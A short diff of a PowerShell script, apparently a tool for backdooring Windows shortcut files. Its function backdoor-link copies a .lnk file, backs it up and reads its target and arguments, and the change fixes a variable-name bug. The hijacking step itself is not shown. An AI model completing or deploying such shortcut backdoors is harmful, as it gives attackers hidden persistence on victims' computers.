@@ -15,7 +15,7 @@ Param
 $fname = (gci $sourcepath | Select-Object -First 1).name
 $destination = $env:HOMEPATH + "\trollz\"
 $backupdir = $destination + "linkbackup\"
-$shortcut = $destination + $fname
+$shortcutname = $destination + $fname
 
 if (Test-Path $destination){Write-Host "$destination is hurr"}
     else {mkdir $destination}
@@ -29,7 +29,7 @@ function backdoor-link($sourcepath, $destination){
     Copy-Item $sourcepath $destination  ## Get the lnk we want to use as a template
     Copy-Item $sourcepath $backupdir
     $shell = New-Object -COM WScript.Shell
-    $shortcut = $shell.CreateShortcut($shortcut)  ## Open the lnk
+    $shortcut = $shell.CreateShortcut($shortcutname)  ## Open the lnk
     $oldicon = $shortcut.TargetPath
     $oldpath = $shortcut.TargetPath -replace '^', "'" -replace '$', "'"
     $oldargs = $shortcut.Arguments
